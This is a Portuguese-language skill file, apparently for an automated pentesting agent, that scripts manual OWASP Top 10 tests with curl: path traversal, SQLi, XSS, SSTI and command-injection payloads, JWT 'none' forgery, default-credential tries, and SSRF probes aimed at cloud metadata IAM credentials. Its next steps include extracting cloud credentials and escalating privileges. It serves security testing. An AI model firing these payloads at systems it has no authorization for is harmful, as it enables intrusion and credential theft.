---
name: owasp_top10_manual_test
phase: 3_vulnerability_analysis
tools: [curl, nikto, burpsuite]
dependencies: [web_service_found]
mitre_tactic: TA0043 (Reconnaissance), TA0001 (Initial Access)
---

# Objetivo
Executar testes manuais abrangentes cobrindo todas as 10 categorias do OWASP Top 10 (edição 2021) utilizando curl e técnicas manuais. Ferramentas automatizadas frequentemente falham em detectar falhas de lógica de negócio, Broken Access Control, IDOR e SSRF — esta skill preenche essas lacunas com testes direcionados e reproduzíveis.

# Condições de Execução
- A aplicação web foi mapeada (diretórios, parâmetros e endpoints conhecidos).
- O alvo possui serviço web acessível (HTTP/HTTPS) confirmado pela skill `web_directory_discovery` ou `tech_stack_fingerprinting`.
- O agente possui capacidade de interagir com a aplicação via requisições HTTP customizadas.
- Tokens de sessão (privilegiado e não privilegiado) devem estar disponíveis para testes de controle de acesso.

# Comandos e Sintaxe

## A01 — Broken Access Control

### 1.1 Teste de IDOR (Insecure Direct Object Reference)
Identifique parâmetros que referenciam objetos (ex: `user_id=123`, `doc=456`) e tente acessar recursos de outros usuários.
```bash
curl -s -H "Cookie: session={session_token}" "https://{target_url}/api/user/100" 2>&1 | tee {workspace}/owasp_idor_base.txt
for id in 101 102 103 999 0 -1; do
  curl -s -H "Cookie: session={session_token}" "https://{target_url}/api/user/${id}" 2>&1 | tee -a {workspace}/owasp_idor_enum.txt
done
```

### 1.2 Path Traversal
Tente acessar arquivos fora do diretório raiz da aplicação.
```bash
for payload in "../../etc/passwd" "..%2f..%2fetc%2fpasswd" "....//....//etc/passwd" "%2e%2e%2f%2e%2e%2fetc%2fpasswd"; do
  curl -s "https://{target_url}/file?path=${payload}" 2>&1 | tee -a {workspace}/owasp_path_traversal.txt
done
```

### 1.3 Forced Browsing (Acesso a Endpoints Restritos)
Tente acessar endpoints administrativos com token de usuário comum.
```bash
for endpoint in "/admin" "/admin/dashboard" "/admin/users" "/api/v1/admin/config" "/management" "/actuator" "/console"; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" -H "Cookie: session={low_priv_token}" "https://{target_url}${endpoint}")
  echo "${endpoint} -> HTTP ${STATUS}" 2>&1 | tee -a {workspace}/owasp_forced_browsing.txt
done
```

### 1.4 Teste de CORS Misconfiguration
Verifique se a aplicação aceita origens arbitrárias e expõe credenciais.
```bash
curl -s -I -H "Origin: https://evil.com" "https://{target_url}/api/data" 2>&1 | grep -i "Access-Control" | tee {workspace}/owasp_cors_test.txt
curl -s -I -H "Origin: null" "https://{target_url}/api/data" 2>&1 | grep -i "Access-Control" | tee -a {workspace}/owasp_cors_test.txt
```

### 1.5 Teste de HTTP Method Tampering
Verifique se métodos HTTP alternativos contornam restrições de acesso.
```bash
for method in GET POST PUT DELETE PATCH OPTIONS TRACE; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X "${method}" -H "Cookie: session={low_priv_token}" "https://{target_url}/admin/users")
  echo "${method} /admin/users -> HTTP ${STATUS}" 2>&1 | tee -a {workspace}/owasp_method_tampering.txt
done
```

## A02 — Cryptographic Failures

### 2.1 Análise SSL/TLS
Verifique protocolos fracos, cifras inseguras e validade do certificado.
```bash
curl -vvI --tlsv1.0 "https://{target_domain}/" 2>&1 | grep -iE "SSL|TLS|cipher|subject|expire|issuer" | tee {workspace}/owasp_ssl_check.txt
curl -vvI --tlsv1.1 "https://{target_domain}/" 2>&1 | grep -iE "SSL|TLS|cipher" | tee -a {workspace}/owasp_ssl_check.txt
```

### 2.2 Cookie Flags de Segurança
Verifique se cookies possuem flags Secure, HttpOnly e SameSite.
```bash
curl -s -I -c - "https://{target_url}/login" 2>&1 | grep -i "Set-Cookie" | tee {workspace}/owasp_cookie_flags.txt
```

### 2.3 Dados Sensíveis em URLs e Headers
Verifique se tokens, senhas ou dados sensíveis são transmitidos via GET ou expostos em headers.
```bash
curl -s -v "https://{target_url}/api/login?username=test&password=test123" 2>&1 | grep -iE "password|token|secret|api.key|authorization" | tee {workspace}/owasp_sensitive_data.txt
```

## A03 — Injection

### 3.1 SQL Injection (Error-based e Blind)
Teste parâmetros com payloads clássicos de SQLi.
```bash
for payload in "'" "' OR '1'='1" "' OR '1'='1'--" "1; SELECT 1--" "' UNION SELECT null,null--" "1' AND SLEEP(5)--"; do
  ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${payload}'))")
  curl -s -w "\n[HTTP %{http_code} | Time: %{time_total}s]\n" "https://{target_url}/search?q=${ENCODED}" 2>&1 | tee -a {workspace}/owasp_sqli_test.txt
done
```

### 3.2 Cross-Site Scripting (XSS Reflected)
Injete payloads XSS em parâmetros de entrada e verifique reflexão no corpo da resposta.
```bash
for payload in "<script>alert(1)</script>" "<img src=x onerror=alert(1)>" "'\"><svg/onload=alert(1)>" "javascript:alert(1)"; do
  ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${payload}'))")
  curl -s "https://{target_url}/search?q=${ENCODED}" 2>&1 | grep -i "alert\|onerror\|onload\|<script" | tee -a {workspace}/owasp_xss_test.txt
done
```

### 3.3 Server-Side Template Injection (SSTI)
Teste se o servidor interpreta expressões de template.
```bash
for payload in "{{7*7}}" "${7*7}" "<%= 7*7 %>" "#{7*7}" "{7*7}"; do
  ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${payload}'))")
  RESPONSE=$(curl -s "https://{target_url}/search?q=${ENCODED}")
  echo "Payload: ${payload} | Resposta contém 49: $(echo ${RESPONSE} | grep -c '49')" 2>&1 | tee -a {workspace}/owasp_ssti_test.txt
done
```

### 3.4 Command Injection
Teste injeção de comandos do sistema operacional em parâmetros.
```bash
for payload in ";id" "|id" "$(id)" "\`id\`" "|| id" "&& id"; do
  ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${payload}'))")
  curl -s "https://{target_url}/api/ping?host=127.0.0.1${ENCODED}" 2>&1 | tee -a {workspace}/owasp_cmdi_test.txt
done
```

## A04 — Insecure Design

### 4.1 Falhas de Lógica de Negócio
Teste manipulação de preços, quantidades e fluxos de workflow.
```bash
# Teste de manipulação de preço (envie valor negativo ou zero)
curl -s -X POST -H "Content-Type: application/json" -H "Cookie: session={session_token}" \
  -d '{"product_id": 1, "quantity": -1, "price": 0.01}' \
  "https://{target_url}/api/cart/add" 2>&1 | tee {workspace}/owasp_logic_price.txt

# Teste de pular etapas no fluxo (ex: ir direto ao pagamento sem carrinho)
curl -s -X POST -H "Cookie: session={session_token}" \
  "https://{target_url}/api/checkout/confirm" 2>&1 | tee -a {workspace}/owasp_logic_flow.txt
```

### 4.2 Rate Limiting Ausente
Verifique se endpoints sensíveis possuem proteção contra abuso.
```bash
for i in $(seq 1 20); do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST -d "username=admin&password=wrong${i}" "https://{target_url}/login")
  echo "Tentativa ${i}: HTTP ${STATUS}" 2>&1 | tee -a {workspace}/owasp_rate_limit.txt
done
```

## A05 — Security Misconfiguration

### 5.1 Credenciais Padrão
Teste credenciais padrão em painéis administrativos e serviços conhecidos.
```bash
for cred in "admin:admin" "admin:password" "admin:123456" "root:root" "test:test" "guest:guest"; do
  USER=$(echo ${cred} | cut -d: -f1)
  PASS=$(echo ${cred} | cut -d: -f2)
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST -d "username=${USER}&password=${PASS}" "https://{target_url}/login")
  echo "${cred} -> HTTP ${STATUS}" 2>&1 | tee -a {workspace}/owasp_default_creds.txt
done
```

### 5.2 Directory Listing
Verifique se diretórios expõem listagem de arquivos.
```bash
for dir in "/" "/images/" "/uploads/" "/backup/" "/static/" "/assets/" "/js/" "/css/" "/.git/"; do
  RESPONSE=$(curl -s "https://{target_url}${dir}" 2>&1)
  if echo "${RESPONSE}" | grep -qi "index of\|directory listing\|parent directory"; then
    echo "[VULN] Directory listing habilitado: ${dir}" 2>&1 | tee -a {workspace}/owasp_dirlist.txt
  fi
done
```

### 5.3 Verbose Error Messages e Stack Traces
Provoque erros e verifique se a aplicação expõe informações internas.
```bash
curl -s "https://{target_url}/api/nonexistent" 2>&1 | tee {workspace}/owasp_error_verbose.txt
curl -s "https://{target_url}/search?q='" 2>&1 | grep -iE "exception|stack.trace|debug|error|traceback|sql|syntax" | tee -a {workspace}/owasp_error_verbose.txt
```

### 5.4 Security Headers Ausentes
Verifique a presença de headers de segurança obrigatórios.
```bash
curl -s -I "https://{target_url}/" 2>&1 | tee {workspace}/owasp_headers_raw.txt
for header in "Strict-Transport-Security" "X-Content-Type-Options" "X-Frame-Options" "Content-Security-Policy" "X-XSS-Protection" "Referrer-Policy" "Permissions-Policy"; do
  if ! grep -qi "${header}" {workspace}/owasp_headers_raw.txt; then
    echo "[AUSENTE] ${header}" 2>&1 | tee -a {workspace}/owasp_missing_headers.txt
  fi
done
```

## A06 — Vulnerable and Outdated Components

### 6.1 Fingerprinting de Versão do Servidor e Frameworks
Identifique versões de tecnologias para busca de CVEs conhecidas.
```bash
curl -s -I "https://{target_url}/" 2>&1 | grep -iE "server:|x-powered-by:|x-aspnet|x-generator|x-drupal|x-wordpress" | tee {workspace}/owasp_version_fingerprint.txt
curl -s "https://{target_url}/" 2>&1 | grep -ioE "jquery[/ ][0-9.]+|bootstrap[/ ][0-9.]+|angular[/ ][0-9.]+|react[/ ][0-9.]+|vue[/ ][0-9.]+" | sort -u | tee -a {workspace}/owasp_version_fingerprint.txt
```

### 6.2 Arquivos de Metadados Expostos
Verifique se arquivos de configuração e metadados estão acessíveis.
```bash
for file in "/package.json" "/composer.json" "/Gemfile" "/requirements.txt" "/web.config" "/.env" "/.git/HEAD" "/wp-config.php.bak" "/phpinfo.php"; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "https://{target_url}${file}")
  if [ "${STATUS}" = "200" ]; then
    echo "[EXPOSTO] ${file} -> HTTP ${STATUS}" 2>&1 | tee -a {workspace}/owasp_exposed_files.txt
  fi
done
```

## A07 — Identification and Authentication Failures

### 7.1 Enumeração de Usuários
Verifique se a aplicação revela a existência de usuários através de mensagens de erro distintas.
```bash
RESP_VALID=$(curl -s -X POST -d "username=admin&password=wrongpass" "https://{target_url}/login" 2>&1)
RESP_INVALID=$(curl -s -X POST -d "username=usuario_inexistente_xyz&password=wrongpass" "https://{target_url}/login" 2>&1)
echo "=== Usuário válido ===" > {workspace}/owasp_user_enum.txt
echo "${RESP_VALID}" >> {workspace}/owasp_user_enum.txt
echo "=== Usuário inválido ===" >> {workspace}/owasp_user_enum.txt
echo "${RESP_INVALID}" >> {workspace}/owasp_user_enum.txt
diff <(echo "${RESP_VALID}") <(echo "${RESP_INVALID}") 2>&1 | tee -a {workspace}/owasp_user_enum.txt
```

### 7.2 Session Fixation
Verifique se a aplicação regenera o ID de sessão após login.
```bash
# Captura cookie antes do login
PRE_LOGIN=$(curl -s -c - "https://{target_url}/login" 2>&1 | grep -i "session\|sid\|token")
echo "=== Pré-Login ===" | tee {workspace}/owasp_session_fixation.txt
echo "${PRE_LOGIN}" | tee -a {workspace}/owasp_session_fixation.txt

# Realiza login e captura novo cookie
POST_LOGIN=$(curl -s -c - -X POST -d "username={test_user}&password={test_pass}" "https://{target_url}/login" 2>&1 | grep -i "session\|sid\|token")
echo "=== Pós-Login ===" | tee -a {workspace}/owasp_session_fixation.txt
echo "${POST_LOGIN}" | tee -a {workspace}/owasp_session_fixation.txt
```

### 7.3 Manipulação de JWT
Se a aplicação utilizar JWT, teste algoritmos fracos e assinaturas inválidas.
```bash
# Decodifique o JWT (header e payload)
TOKEN="{jwt_token}"
echo "${TOKEN}" | cut -d. -f1 | base64 -d 2>/dev/null | python3 -m json.tool 2>&1 | tee {workspace}/owasp_jwt_header.txt
echo "${TOKEN}" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool 2>&1 | tee {workspace}/owasp_jwt_payload.txt

# Teste com algoritmo "none" (CVE clássica)
HEADER_NONE=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w 0 | tr '+/' '-_' | tr -d '=')
PAYLOAD=$(echo "${TOKEN}" | cut -d. -f2)
FORGED="${HEADER_NONE}.${PAYLOAD}."
curl -s -H "Authorization: Bearer ${FORGED}" "https://{target_url}/api/profile" 2>&1 | tee {workspace}/owasp_jwt_none.txt
```

## A08 — Software and Data Integrity Failures

### 8.1 Deserialization Insegura
Teste se a aplicação aceita objetos serializados maliciosos.
```bash
# Verifique headers que indicam serialização
curl -s -I "https://{target_url}/api/data" 2>&1 | grep -iE "content-type.*java|content-type.*serialize|content-type.*pickle|x-java" | tee {workspace}/owasp_deserialization.txt

# Envie payload de teste para endpoints que aceitam dados serializados
curl -s -X POST -H "Content-Type: application/x-java-serialized-object" \
  -d 'ACED0005' "https://{target_url}/api/import" 2>&1 | tee -a {workspace}/owasp_deserialization.txt
```

### 8.2 Integridade de Recursos (Subresource Integrity)
Verifique se scripts externos possuem atributo integrity (SRI).
```bash
curl -s "https://{target_url}/" 2>&1 | grep -i "<script.*src=" | grep -v "integrity=" | tee {workspace}/owasp_sri_missing.txt
```

## A09 — Security Logging and Monitoring Failures

### 9.1 Detecção de Ausência de Logging
Realize ações suspeitas e verifique se a aplicação responde com mecanismos de detecção.
```bash
# Múltiplas tentativas de login falhas (deve acionar lockout ou CAPTCHA)
for i in $(seq 1 10); do
  curl -s -o /dev/null -w "Tentativa ${i}: HTTP %{http_code}\n" \
    -X POST -d "username=admin&password=wrong${i}" "https://{target_url}/login" 2>&1 | tee -a {workspace}/owasp_logging_bruteforce.txt
done

# Verifique se há CAPTCHA, bloqueio ou rate-limiting
tail -n 5 {workspace}/owasp_logging_bruteforce.txt 2>&1 | tee -a {workspace}/owasp_logging_analysis.txt
```

### 9.2 Headers de Segurança para Monitoramento
Verifique headers como Report-To e NEL (Network Error Logging).
```bash
curl -s -I "https://{target_url}/" 2>&1 | grep -iE "report-to|nel|expect-ct|feature-policy" | tee {workspace}/owasp_monitoring_headers.txt
```

## A10 — Server-Side Request Forgery (SSRF)

### 10.1 SSRF via Parâmetros de URL
Teste se a aplicação pode ser forçada a fazer requisições para serviços internos.
```bash
for target in "http://127.0.0.1" "http://localhost" "http://169.254.169.254/latest/meta-data/" "http://[::1]" "http://0x7f000001" "http://2130706433"; do
  ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${target}'))")
  curl -s -X POST -H "Cookie: session={session_token}" \
    -d "url=${ENCODED}" "https://{target_url}/api/fetch" 2>&1 | tee -a {workspace}/owasp_ssrf_test.txt
done
```

### 10.2 SSRF via Headers (Webhook, Redirect)
Teste SSRF através de headers que aceitam URLs.
```bash
curl -s -H "X-Forwarded-For: http://127.0.0.1:8080" -H "Referer: http://169.254.169.254/" \
  "https://{target_url}/api/data" 2>&1 | tee -a {workspace}/owasp_ssrf_headers.txt

# Teste em funcionalidades de webhook/callback
curl -s -X POST -H "Content-Type: application/json" -H "Cookie: session={session_token}" \
  -d '{"callback_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}' \
  "https://{target_url}/api/webhook" 2>&1 | tee -a {workspace}/owasp_ssrf_webhook.txt
```

# Análise de Resultados

- **A01 — IDOR confirmado:** Se a resposta retornar dados de outro usuário, registre como vulnerabilidade crítica. Verifique se permite escrita (PUT/PATCH/DELETE).
- **A01 — Forced Browsing:** Se endpoints admin retornarem HTTP 200 para usuário comum, registre como Privilege Escalation (alto risco).
- **A01 — CORS permissivo:** Se retornar `Access-Control-Allow-Origin: https://evil.com` com `Allow-Credentials: true`, registre como vulnerabilidade média/alta.
- **A02 — TLS fraco:** Se TLSv1.0 ou TLSv1.1 forem aceitos, registre como vulnerabilidade média. Cifras RC4/DES são críticas.
- **A02 — Cookies inseguros:** Ausência de flags Secure, HttpOnly ou SameSite em cookies de sessão são vulnerabilidades médias.
- **A03 — SQLi confirmado:** Se houver erro de SQL ou diferença de tempo (blind), acione a skill `sql_injection_exploitation`.
- **A03 — XSS confirmado:** Se o payload for refletido sem sanitização no corpo da resposta, registre com o contexto (reflected/stored/DOM).
- **A03 — SSTI confirmado:** Se `{{7*7}}` retornar `49`, a aplicação é vulnerável a Remote Code Execution via template injection.
- **A03 — Command Injection:** Se a saída do comando `id` aparecer na resposta, registre como vulnerabilidade crítica (RCE).
- **A04 — Falha de lógica:** Preço zero, quantidade negativa aceita ou etapas do fluxo ignoradas indicam falha de design.
- **A05 — Credenciais padrão:** Qualquer HTTP 200/302 (redirect para dashboard) indica acesso com credencial padrão — vulnerabilidade crítica.
- **A05 — Directory listing:** Exposição de listagem de diretórios permite reconhecimento e potencial acesso a dados sensíveis.
- **A06 — Versões expostas:** Compare versões identificadas contra bases de CVE. Acione a skill `cve_search_engine`.
- **A07 — Enumeração de usuários:** Mensagens de erro distintas para usuário válido/inválido permitem enumeração — risco médio.
- **A07 — JWT com "none":** Se o token forjado for aceito, a aplicação é vulnerável a bypass completo de autenticação — crítico.
- **A08 — SRI ausente:** Scripts externos sem integrity hash são vulneráveis a ataques de supply chain.
- **A09 — Sem rate limiting:** Se todas as tentativas retornarem o mesmo código HTTP, a aplicação não possui mecanismo de detecção de ataque.
- **A10 — SSRF confirmado:** Se a resposta contiver metadados AWS, IPs internos ou dados de serviços locais, registre como vulnerabilidade crítica.

# Próximos Passos
- Para cada SQLi confirmado, acione a skill `sql_injection_exploitation` com o endpoint e parâmetro vulnerável.
- Para versões de componentes expostas, acione a skill `cve_search_engine` para busca de CVEs conhecidas.
- Para credenciais padrão encontradas, acione a skill `bruteforce_authentication` para testar em outros serviços.
- Para SSRF confirmado em ambiente cloud, tente extrair credenciais do serviço de metadados (AWS/GCP/Azure).
- Se JWT fraco for detectado, tente escalar privilégios alterando claims no payload (ex: `"role": "admin"`).
- Registre todos os achados no Knowledge Graph com severidade, endpoint, evidência e categoria OWASP.
- Acione a skill `mitre_attack_mapping` para mapear os achados às técnicas MITRE ATT&CK correspondentes.
- Acione a skill `generate_pentest_report` para inclusão dos resultados no relatório executivo.

# Tratamento de Erros
- Se a aplicação usar CSRF tokens, extraia o token da página anterior antes de enviar requisições POST/PUT:
  `CSRF=$(curl -s "https://{target_url}/form" | grep -oP 'csrf[_-]?token.*?value="\K[^"]+')`.
- Se a sessão expirar durante os testes, utilize a skill `bruteforce_authentication` ou solicite ao operador um novo token.
- Se o WAF bloquear requisições (HTTP 403/429), reduza a velocidade dos testes com `sleep 2` entre requisições.
- Se `python3` não estiver disponível para URL encoding, use: `curl -Gso /dev/null -w '%{url_effective}' --data-urlencode "q=${payload}" ""`.
- Se curl retornar erro de SSL (`SSL certificate problem`), adicione `--insecure` (-k) para ignorar verificação — registre o problema de certificado.
- Se o alvo utilizar autenticação Bearer, substitua `Cookie: session={session_token}` por `Authorization: Bearer {session_token}`.
- Se nikto estiver disponível, complemente os testes manuais com: `nikto -h https://{target_url} -output {workspace}/owasp_nikto.txt -Format txt`.
